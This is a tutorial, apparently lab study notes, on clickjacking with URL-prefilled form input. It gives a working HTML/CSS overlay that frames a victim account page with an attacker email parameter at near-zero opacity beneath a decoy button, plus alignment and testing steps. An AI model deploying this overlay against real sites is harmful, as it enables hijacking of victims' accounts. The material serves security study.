# Clickjacking With Prefilled Form Input

## Overview

Some applications allow form fields to be prepopulated using values supplied through URL parameters.

This behavior can make clickjacking more effective because the attacker may be able to control the value that appears in the target form before the victim clicks the target action.

---

# Core Concept

```text
Attacker Controls URL Parameter
            ↓
Target Page Loads
            ↓
Form Field Is Prepopulated
            ↓
Target Page Is Framed
            ↓
Target Button Is Hidden Under Decoy
            ↓
Victim Clicks Decoy
            ↓
Prepopulated Form Is Submitted
```

---

# Example

Suppose the target page supports:

```text
/my-account?email=foo@example.com
```

The application may use the `email` parameter to populate the email field.

The page could therefore display:

```text
Email:
foo@example.com
```

before the victim performs any interaction.

---

# Why This Matters

Without prefilled input, the attacker may need the victim to enter information manually.

With a URL-controlled parameter:

```text
Attacker
   ↓
Controls URL
   ↓
Controls Initial Form Value
```

The victim may only need to click the target button.

---

# Basic Attack Structure

```text
Attacker Page
      ↓
iframe
      ↓
/my-account?email=attacker@example.com
      ↓
Email field already populated
      ↓
Transparent Update button
      ↓
Visible "Click me" decoy
      ↓
Victim clicks
      ↓
Email updated
```

---

# Basic iframe

```html
<iframe
    src="https://victim-website.com/my-account?email=attacker@example.com">
</iframe>
```

The exact URL depends on the target application's behavior.

---

# Testing the Parameter

First test the parameter normally.

Example:

```text
/my-account?email=test@example.com
```

Inspect the rendered page.

Determine whether:

```text
test@example.com
```

appears inside the email input.

---

# Burp Verification

Use Burp Suite to inspect:

```text
Proxy → HTTP history
```

Look at the request:

```http
GET /my-account?email=test@example.com
```

Then inspect the response.

Determine whether the supplied value is reflected into the form.

---

# Form Example

A vulnerable form might conceptually contain:

```html
<input
    type="email"
    name="email"
    value="test@example.com">
```

The attacker can therefore control the initial value using the URL.

---

# Clickjacking Overlay

Once the value is prepopulated, construct the overlay.

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe
    src="https://victim-website.com/my-account?email=attacker@example.com">
</iframe>
```

The position values must be adjusted to match the target button.

---

# Alignment

During testing, use:

```css
opacity: 0.1;
```

This makes the iframe visible enough to align the decoy with the target control.

Once correctly aligned:

```css
opacity: 0.0001;
```

can be used for the final exploit.

---

# Target Action

The target action might be:

```text
Update email
```

The victim sees:

```text
Click me
```

The actual target underneath is:

```text
Update email
```

The victim's click therefore submits the prefilled form.

---

# Lab Workflow

The supplied material describes a lab where the objective is to change the user's email address.

The workflow is:

```text
Login
  ↓
Identify email form
  ↓
Identify URL parameter
  ↓
Confirm parameter prepopulates form
  ↓
Frame account page
  ↓
Position decoy
  ↓
Align with Update email button
  ↓
Deliver exploit
  ↓
Email address changes
```

---

# Testing With a Harmless Value

During initial testing, use a controlled value such as:

```text
test@example.com
```

Confirm that the target page displays it correctly before attempting the complete lab exploit.

---

# URL Encoding

Special characters in URL parameters may need to be URL encoded.

For example:

```text
@
```

can appear as:

```text
%40
```

depending on how the URL is constructed.

---

# Important

The exact parameter name is application-specific.

Do not assume every application uses:

```text
email
```

Possible applications may use different names.

The correct approach is:

```text
Inspect Form
      ↓
Identify URL-controlled Parameter
      ↓
Test Reflection
      ↓
Confirm Prepopulation
```

---

# Security Impact

If an attacker can control a sensitive form value and combine this with clickjacking, the victim may unintentionally submit attacker-controlled data.

Possible consequences depend on the target action.

Examples include:

```text
Email change
Profile modification
Account setting changes
Other sensitive form actions
```

---

# Testing Checklist

```text
☐ Identify sensitive form
☐ Identify target action
☐ Inspect GET parameters
☐ Test URL-controlled input
☐ Confirm form prepopulation
☐ Confirm page is frameable
☐ Check X-Frame-Options
☐ Check CSP frame-ancestors
☐ Create iframe
☐ Align decoy with target button
☐ Test using partial opacity
☐ Reduce opacity after alignment
☐ Deliver exploit in authorized environment
☐ Confirm target action
```

---

# Key Takeaways

- Some forms can be prepopulated through URL parameters.
- URL-controlled form input can make clickjacking attacks more practical.
- The attacker can place the target page inside an iframe with the desired value already populated.
- The victim may only need to click the target action.
- The exact parameter must be identified from the application's behavior.
- Test reflection and prepopulation before constructing the full clickjacking overlay.
- Frame protection remains an important defense.